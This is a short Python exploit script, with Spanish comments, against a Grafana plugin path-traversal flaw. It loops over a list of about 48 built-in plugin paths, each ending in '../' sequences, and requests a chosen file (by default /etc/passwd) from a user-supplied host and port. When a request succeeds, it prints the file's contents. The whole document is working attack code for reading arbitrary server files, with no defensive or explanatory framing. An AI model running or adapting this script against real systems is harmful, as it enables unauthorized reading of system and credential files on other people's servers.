import http.client
import argparse


# Define la lista de directorios
directory_list = [
	"/public/plugins/alertGroups/../../../../../../../..",
	"/public/plugins/alertlist/../../../../../../../..",
	"/public/plugins/alertmanager/../../../../../../../..",
	"/public/plugins/annolist/../../../../../../../..",
	"/public/plugins/barchart/../../../../../../../..",
	"/public/plugins/bargauge/../../../../../../../..",
	"/public/plugins/canvas/../../../../../../../..",
	"/public/plugins/cloudwatch/../../../../../../../..",
	"/public/plugins/dashboard/../../../../../../../..",
	"/public/plugins/dashlist/../../../../../../../..",
	"/public/plugins/debug/../../../../../../../..",
	"/public/plugins/elasticsearch/../../../../../../../..",
	"/public/plugins/gauge/../../../../../../../..",
	"/public/plugins/geomap/../../../../../../../..",
	"/public/plugins/gettingstarted/../../../../../../../..",
	"/public/plugins/grafana-azure-monitor-datasource/../../../../../../../..",
	"/public/plugins/grafana/../../../../../../../..",
	"/public/plugins/graph/../../../../../../../..",
	"/public/plugins/graphite/../../../../../../../..",
	"/public/plugins/heatmap/../../../../../../../..",
	"/public/plugins/histogram/../../../../../../../..",
	"/public/plugins/influxdb/../../../../../../../..",
	"/public/plugins/jaeger/../../../../../../../..",
	"/public/plugins/live/../../../../../../../..",
	"/public/plugins/logs/../../../../../../../..",
	"/public/plugins/loki/../../../../../../../..",
	"/public/plugins/mixed/../../../../../../../..",
	"/public/plugins/mssql/../../../../../../../..",
	"/public/plugins/mysql/../../../../../../../..",
	"/public/plugins/news/../../../../../../../..",
	"/public/plugins/nodeGraph/../../../../../../../..",
	"/public/plugins/opentsdb/../../../../../../../..",
	"/public/plugins/piechart/../../../../../../../..",
	"/public/plugins/pluginlist/../../../../../../../..",
	"/public/plugins/postgres/../../../../../../../..",
	"/public/plugins/prometheus/../../../../../../../..",
	"/public/plugins/stat/../../../../../../../..",
	"/public/plugins/state-timeline/../../../../../../../..",
	"/public/plugins/status-history/../../../../../../../..",
	"/public/plugins/table-old/../../../../../../../..",
	"/public/plugins/table/../../../../../../../..",
	"/public/plugins/tempo/../../../../../../../..",
	"/public/plugins/testdata/../../../../../../../..",
	"/public/plugins/text/../../../../../../../..",
	"/public/plugins/timeseries/../../../../../../../..",
	"/public/plugins/welcome/../../../../../../../..",
	"/public/plugins/xychart/../../../../../../../..",
	"/public/plugins/zipkin/../../../../../../../.."

]

def check_directories(domain, port, file_path="/etc/passwd"):

    for directory in directory_list:
        conn = http.client.HTTPConnection(domain, port)
        conn.request("GET", directory + file_path)
        response = conn.getresponse()
        if response.status == 200:
            print(f"Archivo encontrado: http://{domain}:{port}{directory}{file_path}")
            print("Respuesta completa:")
            print(f"URL: http://{domain}:{port}{directory}{file_path}")
            print(f"Estado: {response.status}")
            print("Encabezados:")
            print(response.getheaders())
            print("Contenido del archivo:")
            print(response.read().decode())
            break
        else:
            print(f"URL: http://{domain}:{port}{directory}{file_path}: "+response.read().decode())
        conn.close()

def main():
    parser = argparse.ArgumentParser(description="Busca archivos específicos en un sitio web.")
    parser.add_argument("-d", "--domain", type=str, required=True, help="El dominio o la IP del sitio.")
    parser.add_argument("-p", "--port", type=str, required=True, help="El puerto del sitio.")
    parser.add_argument("-f", "--files", type=str, default="/etc/passwd", help="La ruta del archivo que deseas consultar, ejemplo: /etc/passwd")

    args = parser.parse_args()

    check_directories(args.domain, args.port, args.files)

if __name__ == "__main__":
    main()
